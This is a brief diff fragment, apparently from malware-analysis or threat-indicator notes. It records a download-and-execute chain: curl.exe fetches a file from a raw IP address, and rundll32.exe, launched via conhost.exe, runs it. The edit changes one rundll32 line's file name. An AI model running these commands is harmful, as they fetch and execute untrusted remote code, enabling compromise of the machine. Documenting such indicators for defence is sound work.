@@ -17,7 +17,7 @@ curl.exe -o amounted.tmp.tmp http://192.121.17.149/QmVep/DB278
 
 conhost.exe rundll32.exe amounted.tmp,must
 
-rundll32.exe prism.tmp,must
+rundll32.exe amounted.tmp,must
 
 
 *************************************************
